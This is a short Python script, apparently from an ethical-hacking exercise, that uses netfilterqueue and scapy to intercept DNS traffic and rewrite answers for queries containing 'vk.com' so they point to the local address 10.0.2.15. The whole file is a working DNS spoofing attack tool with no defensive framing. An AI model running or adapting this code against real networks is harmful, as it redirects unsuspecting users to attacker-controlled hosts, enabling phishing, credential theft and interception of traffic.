#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


def packet_analysis(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        query_name = scapy_packet[scapy.DNSQR].qname
        if "vk.com" in query_name:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=query_name, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()


if __name__ == '__main__':
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, packet_analysis)
    queue.run()
